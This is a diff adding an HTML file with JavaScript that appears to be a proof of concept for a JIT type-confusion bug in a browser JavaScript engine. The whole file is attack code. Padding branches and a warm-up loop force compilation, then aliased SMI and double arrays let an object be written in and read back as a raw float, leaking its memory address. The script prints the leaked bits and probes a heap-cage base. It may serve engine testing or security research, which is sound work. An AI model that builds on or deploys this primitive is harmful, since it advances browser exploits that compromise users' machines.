@@ -1,0 +1,53 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+const N_BLOCKS = 650;
+const lines = ["function trigger(x, arr, alias, obj, idx, limit) {"];
+for (let i = 0; i < N_BLOCKS; i++) {
+  lines.push(`  if (x === ${i}) return ${i};`);
+}
+lines.push(`
+  arr[0] = obj;
+  let i = 0;
+  let res = 0;
+  while (i < limit) {
+    res = alias[idx] + 0.0;
+    i++;
+  }
+  return res;
+}`);
+lines.push("return trigger;");
+const trigger = new Function(lines.join("\n"))();
+
+const obj = {marker: 0x1337};
+function makeSmi(poison) {
+  const a = [1, 2, 3];
+  if (poison) a.sinkhole = 1;
+  return a;
+}
+function makeDouble(poison) {
+  const a = [1.1, 2.2, 3.3];
+  if (poison) a.sinkhole = 1;
+  return a;
+}
+makeSmi(true);
+makeDouble(true);
+
+for (let i = 0; i < 30000; i++) {
+  trigger(1000, makeSmi(false), makeDouble(false), obj, 0, 1);
+  trigger(1000, makeDouble(false), makeSmi(false), obj, 0, 1);
+  trigger(1000, makeDouble(false), makeDouble(false), obj, 0, 1);
+}
+console.log("warmup complete");
+
+const bits = new BigUint64Array(new ArrayBuffer(8));
+const f64 = new Float64Array(bits.buffer);
+setTimeout(() => {
+  const victim = makeDouble(false);
+  const result = trigger(1000, victim, victim, obj, 0, 1);
+  f64[0] = result;
+  console.log("result", typeof result, result, "bits", "0x" + bits[0].toString(16));
+  console.log("victim0", typeof victim[0], victim[0]);
+  console.log("cage", typeof cageBase === "function" ? "0x" + cageBase().toString(16) : "missing");
+}, 2000);
+</script>
